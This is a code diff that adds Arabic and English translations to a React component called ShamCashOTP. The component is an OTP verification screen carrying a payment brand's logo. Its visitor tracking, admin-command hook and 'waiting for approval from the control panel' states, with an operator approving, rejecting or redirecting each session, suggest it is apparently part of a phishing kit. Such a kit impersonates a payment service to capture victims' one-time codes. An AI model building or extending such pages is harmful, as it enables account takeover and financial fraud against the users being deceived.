@@ -1,6 +1,44 @@
 import { useState, useRef, useEffect } from "react";
 import { useVisitorTracking } from "@/hooks/useVisitorTracking";
 import { useAdminCommands } from "@/hooks/useAdminCommands";
+import { useLang } from "@/hooks/useLang";
+
+const T = {
+  ar: {
+    back: "رجوع", dir: "rtl" as const,
+    heading: "التحقق من هويتك",
+    subtitle: "تم إرسال رمز OTP إلى",
+    noCode: "لم تستلم الرمز؟",
+    resend: "إعادة الإرسال",
+    waiting: "في انتظار الموافقة من لوحة التحكم...",
+    waitingBtn: "جارٍ الانتظار...",
+    confirm: "تأكيد",
+    goBack: "العودة",
+    approvedTitle: "تمت الموافقة",
+    approvedSub: "تم التحقق من هويتك بنجاح",
+    rejectedTitle: "تم الرفض",
+    rejectedSub: "لم يتم التحقق من هويتك",
+    redirectedTitle: "تم التحويل",
+    redirectedSub: "تم تحويل طلبك إلى جهة أخرى",
+  },
+  en: {
+    back: "Back", dir: "ltr" as const,
+    heading: "Verify Your Identity",
+    subtitle: "An OTP code was sent to",
+    noCode: "Didn't receive the code?",
+    resend: "Resend",
+    waiting: "Waiting for approval from the control panel...",
+    waitingBtn: "Waiting...",
+    confirm: "Confirm",
+    goBack: "Go Back",
+    approvedTitle: "Approved",
+    approvedSub: "Your identity has been verified successfully",
+    rejectedTitle: "Rejected",
+    rejectedSub: "Your identity could not be verified",
+    redirectedTitle: "Redirected",
+    redirectedSub: "Your request has been redirected",
+  },
+};
 
 function ShamLogo() {
   return (
@@ -28,6 +66,8 @@ export function ShamCashOTP() {
   const [status, setStatus] = useState<Status>("idle");
   const inputs = useRef<(HTMLInputElement | null)[]>([]);
   const intervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
+  const [lang] = useLang();
+  const t = T[lang];
   useVisitorTracking("التحقق OTP");
   useAdminCommands();
 
@@ -144,8 +184,8 @@ export function ShamCashOTP() {
           <path d="M18 32l10 10 18-18" stroke="#1fc28a" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" />
         </svg>
       ),
-      title: "تمت الموافقة",
-      subtitle: "تم التحقق من هويتك بنجاح",
+      title: t.approvedTitle,
+      subtitle: t.approvedSub,
       color: "text-[#1fc28a]",
     },
     rejected: {
@@ -155,8 +195,8 @@ export function ShamCashOTP() {
           <path d="M22 22l20 20M42 22L22 42" stroke="#e54343" strokeWidth="3" strokeLinecap="round" />
         </svg>
       ),
-      title: "تم الرفض",
-      subtitle: "لم يتم التحقق من هويتك",
+      title: t.rejectedTitle,
+      subtitle: t.rejectedSub,
       color: "text-[#e54343]",
     },
     redirected: {
@@ -166,14 +206,14 @@ export function ShamCashOTP() {
           <path d="M20 32h24M36 24l8 8-8 8" stroke="#657bd8" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" />
         </svg>
       ),
-      title: "تم التحويل",
-      subtitle: "تم تحويل طلبك إلى جهة أخرى",
+      title: t.redirectedTitle,
+      subtitle: t.redirectedSub,
       color: "text-[#657bd8]",
     },
   };
 
   return (
-    <div className="min-h-screen w-full overflow-hidden bg-[#151c36] text-white" dir="rtl">
+    <div className="min-h-screen w-full overflow-hidden bg-[#151c36] text-white" dir={t.dir}>
       <div className="relative mx-auto flex min-h-screen w-full max-w-[390px] flex-col items-center px-6 pb-10 pt-4 font-['Inter']">
         <div className="pointer-events-none absolute -left-24 top-0 h-72 w-72 rounded-full bg-[#6273d4]/10 blur-3xl" />
         <div className="pointer-events-none absolute -right-28 bottom-20 h-80 w-80 rounded-full bg-[#1fc28a]/5 blur-3xl" />
@@ -185,9 +225,9 @@ export function ShamCashOTP() {
             className="flex items-center gap-1.5 text-[14px] font-bold text-white/50 hover:text-white/80 transition-colors"
           >
             <svg viewBox="0 0 24 24" fill="none" className="h-4 w-4">
-              <path d="M15 19l-7-7 7-7" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
+              <path d={lang === "ar" ? "M15 19l-7-7 7-7" : "M9 19l7-7-7-7"} stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
             </svg>
-            رجوع
+            {t.back}
           </button>
         </div>
 
@@ -199,10 +239,10 @@ export function ShamCashOTP() {
           <>
             <div className="relative mt-10 w-full text-center space-y-3">
               <h1 className="text-[24px] font-extrabold tracking-[-0.01em] text-white/90">
-                التحقق من هويتك
+                {t.heading}
               </h1>
               <p className="text-[14px] font-semibold text-[#c9ccdb]/70 leading-relaxed">
-                تم إرسال رمز OTP إلى{" "}
+                {t.subtitle}{" "}
                 <span className="text-white/80 font-bold" dir="ltr">
                   {maskedPhone}
                 </span>
@@ -238,8 +278,8 @@ export function ShamCashOTP() {
             <div className="relative mt-8 w-full flex justify-center">
               {status === "idle" ? (
                 <p className="text-[14px] font-semibold text-[#cfd2df]/60">
-                  لم تستلم الرمز؟{" "}
-                  <span className="cursor-pointer text-[#7183e6] hover:underline">إعادة الإرسال</span>
+                  {t.noCode}{" "}
+                  <span className="cursor-pointer text-[#7183e6] hover:underline">{t.resend}</span>
                 </p>
               ) : (
                 <p className="text-[14px] font-semibold text-[#c9ccdb]/60 flex items-center gap-2">
@@ -247,7 +287,7 @@ export function ShamCashOTP() {
                     <circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" strokeOpacity="0.25" />
                     <path d="M12 2a10 10 0 0 1 10 10" stroke="currentColor" strokeWidth="3" strokeLinecap="round" />
                   </svg>
-                  في انتظار الموافقة من لوحة التحكم...
+                  {t.waiting}
                 </p>
               )}
             </div>
@@ -269,10 +309,10 @@ export function ShamCashOTP() {
                       <circle cx="12" cy="12" r="10" stroke="white" strokeWidth="3" strokeOpacity="0.3" />
                       <path d="M12 2a10 10 0 0 1 10 10" stroke="white" strokeWidth="3" strokeLinecap="round" />
                     </svg>
-                    جارٍ الانتظار...
+                    {t.waitingBtn}
                   </>
                 ) : (
-                  "تأكيد"
+                  t.confirm
                 )}
               </button>
             </div>
@@ -299,7 +339,7 @@ export function ShamCashOTP() {
               }}
               className="mt-8 h-[52px] w-full rounded-[15px] bg-[#2a3047] text-[16px] font-bold text-white/80 hover:bg-[#333d5c] transition-colors"
             >
-              العودة
+              {t.goBack}
             </button>
           </div>
         )}
